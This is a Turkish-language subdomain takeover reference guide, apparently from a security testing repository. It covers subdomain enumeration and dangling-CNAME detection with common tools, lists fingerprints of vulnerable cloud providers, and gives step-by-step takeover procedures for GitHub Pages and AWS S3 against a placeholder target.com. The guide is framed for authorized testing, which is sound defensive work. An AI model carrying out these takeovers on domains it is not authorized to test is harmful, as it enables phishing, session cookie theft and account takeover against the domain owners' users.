[🇬🇧 English](../../README.md)

# 🎯 Alt Alan Adı Ele Geçirme (Subdomain Takeover) Başvuru Kılavuzu

```
  ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗
  ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║
  ███████╗██║   ██║██████╔╝██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║
  ╚════██║██║   ██║██╔══██╗██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║
  ███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
  ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                ████████╗ █████╗ ██╗  ██╗███████╗ ██████╗ ██╗   ██╗███████╗██████╗ 
                ╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗
                   ██║   ███████║█████╔╝ █████╗  ██║   ██║██║   ██║█████╗  ██████╔╝
                   ██║   ██╔══██║██╔═██╗ ██╔══╝  ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
                   ██║   ██║  ██║██║  ██╗███████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║
                   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝
```

---

## 🎯 Alt Alan Adı Ele Geçirme (Subdomain Takeover) Nedir?

**Alt Alan Adı Ele Geçirme (Subdomain Takeover)**, bir alt alan adının DNS kaydı (CNAME) üzerinden işaret ettiği üçüncü taraf bir hizmetin kaldırılması/silinmesi sonucunda meydana gelir. Saldırgan bu boştaki hizmet adını ilgili sağlayıcıda kendi adına tescil ederek alt alan adının kontrolünü ele geçirebilir ve kurbanlara zararlı içerik sunabilir.

### Etkileri
- 🔴 **Oltalama (Phishing)** - Güvenilir kurumsal alan adı altında inandırıcı sahte sayfalar barındırma
- 🔴 **Çerez Hırsızlığı (Cookie Theft)** - Üst alan adında tanımlanmış hassas oturum çerezlerini çalma
- 🔴 **Hesap Ele Geçirme (Account Takeover)** - OAuth geri dönüş (callback) URL'lerini ele geçirme
- 🔴 **İtibar Kaybı** - Kurum adına zararlı yazılım veya dolandırıcılık içeriği yayınlama

---

## 🔍 Tespit Metodolojisi

### Adım 1: Alt Alan Adlarını Numaralandırma
```bash
# En iyi kapsam için birden çok araç kullanın
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
assetfinder --subs-only target.com >> subs.txt

# Birleştirme ve tekilleştirme
cat subs.txt amass.txt | sort -u > all_subs.txt
```

### Adım 2: CNAME Kayıtlarını Tespit Etme
```bash
# DNS kayıtlarını kontrol etme
cat all_subs.txt | while read sub; do
    cname=$(dig CNAME +short $sub)
    if [ ! -z "$cname" ]; then
        echo "$sub -> $cname"
    fi
done

# Veya dnsrecon ile
dnsrecon -d target.com -t crt
```

### Adım 3: Sahipsiz (Dangling) CNAME'leri Kontrol Etme
```bash
# Manuel kontrol
dig CNAME subdomain.target.com +short
# Dönen değer: ornek.cloudfront.net
# Ardından bu hizmetin sahipsiz olup olmadığını kontrol edin

# Durum kodları için httpx
cat all_subs.txt | httpx -status-code -title -tech-detect -no-color
```

---

## 🛠️ Otomatik Araçlar

### Subjack
```bash
# Kurulum
go install github.com/haccer/subjack@latest

# Tarama
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl

# Parmak izleriyle birlikte tarama
subjack -w subdomains.txt -t 100 -a -timeout 30 -o results.txt -ssl
```

### Nuclei (Takeover Şablonları)
```bash
# Nuclei şablonları ile tarama
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/ -o takeovers.txt

# Belirli takeover kontrolleri
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/subdomain-takeover.yaml
```

### Can-I-Take-Over-XYZ
```bash
# Parmak izleri (fingerprints) için GitHub deposunu kontrol edin:
# https://github.com/EdOverflow/can-i-take-over-xyz

# Parmak izlerini manuel veya otomatik araçlarla eşleştirin
```

---

## 📋 Zafiyete Açık Hizmetler ve Parmak İzleri

### AWS S3
```
CNAME: bucket.s3.amazonaws.com
CNAME: bucket.s3-website-region.amazonaws.com

Parmak İzi: "NoSuchBucket"
Parmak İzi: "The specified bucket does not exist"

Ele Geçirme: Aynı isimde yeni bir S3 bucket oluşturun
```

### AWS CloudFront
```
CNAME: xxxxx.cloudfront.net

Parmak İzi: "Bad Request"
Parmak İzi: "ERROR: The request could not be satisfied"

Ele Geçirme: Aynı alternatif alan adı (alternate domain) ile CloudFront dağıtımı oluşturun
```

### GitHub Pages
```
CNAME: username.github.io
CNAME: organization.github.io

Parmak İzi: "There isn't a GitHub Pages site here"

Ele Geçirme: 
1. username.github.io isimli depo oluşturun
2. Depoya hedef alt alan adını içeren CNAME dosyası ekleyin
```

### Heroku
```
CNAME: xxx.herokuapp.com
CNAME: xxx.herokudns.com

Parmak İzi: "No such app"
Parmak İzi: "There's nothing here, yet"

Ele Geçirme: Heroku üzerinde aynı isimde uygulama oluşturun
```

### Azure
```
CNAME: xxx.azurewebsites.net
CNAME: xxx.cloudapp.azure.com
CNAME: xxx.blob.core.windows.net

Parmak İzi: "404 - Web Site not found"

Ele Geçirme: Azure üzerinde aynı isimde kaynak oluşturun
```

### Shopify
```
CNAME: shops.myshopify.com

Parmak İzi: "Sorry, this shop is currently unavailable"
Parmak İzi: "Only one step left"

Ele Geçirme: Bir Shopify mağazası oluşturup özel alan adı olarak ekleyin
```

### WordPress.com
```
CNAME: xxx.wordpress.com

Parmak İzi: "Do you want to register *.wordpress.com?"

Ele Geçirme: Alt alan adını WordPress.com üzerinde tescil edin
```

### Zendesk
```
CNAME: xxx.zendesk.com

Parmak İzi: "Help Center Closed"
Parmak İzi: "This help center no longer exists"

Ele Geçirme: Her zaman mümkün olmayabilir - Zendesk yapılandırmasına bağlıdır
```

### Fastly
```
CNAME: xxx.fastly.net

Parmak İzi: "Fastly error: unknown domain"

Ele Geçirme: Alan adını Fastly servisinize ekleyin
```

### Pantheon
```
CNAME: xxx.pantheonsite.io

Parmak İzi: "The gods are wise but do not know of the site"
Parmak İzi: "404 error unknown site!"

Ele Geçirme: Pantheon üzerinde siteyi oluşturun
```

---

## 🔥 İstismar Adımları

### Örnek: GitHub Pages Ele Geçirme

```bash
# 1. Zafiyetli alt alan adını tespit edin
dig CNAME blog.target.com
# Dönen değer: target.github.io (fakat depo mevcut değil)

# 2. GitHub deposunu oluşturun
# Oluşturulacak: yourusername/target (veya org/target)

# 3. Depo ayarlarından GitHub Pages'i etkinleştirin

# 4. Aşağıdaki içeriğe sahip CNAME dosyasını ekleyin:
blog.target.com

# 5. DNS yayılmasını bekleyin

# 6. Ele geçirmeyi doğrulayın
curl https://blog.target.com
```

### Örnek: AWS S3 Bucket Ele Geçirme

```bash
# 1. Zafiyeti doğrulayın
dig CNAME assets.target.com
# Dönen değer: assets-target.s3.amazonaws.com

curl http://assets-target.s3.amazonaws.com
# Dönen yanıt: NoSuchBucket

# 2. S3 bucket oluşturun (aynı bölgede)
aws s3 mb s3://assets-target --region us-east-1

# 3. Bucket yapılandırmasını yapın
# Web sitesi barındırma veya genel erişimi etkinleştirin

# 4. İçerik yükleyin
echo "Subdomain Takeover PoC" > index.html
aws s3 cp index.html s3://assets-target/

# 5. Doğrulayın
curl http://assets.target.com
```

---

## 📊 Hızlı Başvuru

### Zafiyetli Hizmet Tespiti

| Hizmet | CNAME Deseni | Parmak İzi (Fingerprint) |
|--------|--------------|-------------------------|
| AWS S3 | `*.s3.amazonaws.com` | NoSuchBucket |
| CloudFront | `*.cloudfront.net` | Bad Request |
| GitHub | `*.github.io` | No GitHub Pages |
| Heroku | `*.herokuapp.com` | No such app |
| Azure | `*.azurewebsites.net` | 404 Web Site not found |
| Shopify | `shops.myshopify.com` | Shop unavailable |

### Ele Geçirme Kontrol Listesi

```markdown
- [ ] Tüm alt alan adlarını numaralandır
- [ ] CNAME kayıtlarını tespit et
- [ ] Sahipsiz (dangling) kayıtları kontrol et
- [ ] Parmak izlerini eşleştir
- [ ] Hizmetin gerçekten sahipsiz olduğunu doğrula
- [ ] Etik sınırlar içinde ele geçirmeyi dene
- [ ] Raporla ve belgele
```

---

## 🛠️ Araç Özeti

| Araç | Amaç |
|------|------|
| **subjack** | Otomatik takeover tespiti |
| **nuclei** | Şablon tabanlı zafiyet tarama |
| **can-i-take-over-xyz** | Parmak izi referans kılavuzu |
| **dnsrecon** | DNS numaralandırma |
| **subfinder** | Alt alan adı keşfi |
| **httpx** | HTTP sondajı ve durum kontrolü |

---

## 📚 Kaynaklar

- [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Subjack](https://github.com/haccer/subjack)
- [Nuclei Takeover Şablonları](https://github.com/projectdiscovery/nuclei-templates/tree/main/takeovers)

---

<p align="center">
  <b>🎯 Alt Alan Adlarını Ele Geçirin!</b><br>
  <i>Yalnızca yetkili ve yasal testler içindir!</i>
</p>
